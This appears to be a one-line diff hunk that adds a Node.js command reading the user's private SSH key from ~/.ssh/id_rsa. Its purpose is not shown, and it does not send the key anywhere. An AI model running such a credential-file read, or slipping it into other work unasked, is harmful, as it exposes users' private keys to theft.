@@ -1,0 +1,1 @@
+node -e 'require("fs").readFileSync(process.env.HOME+"/.ssh/id_rsa")'
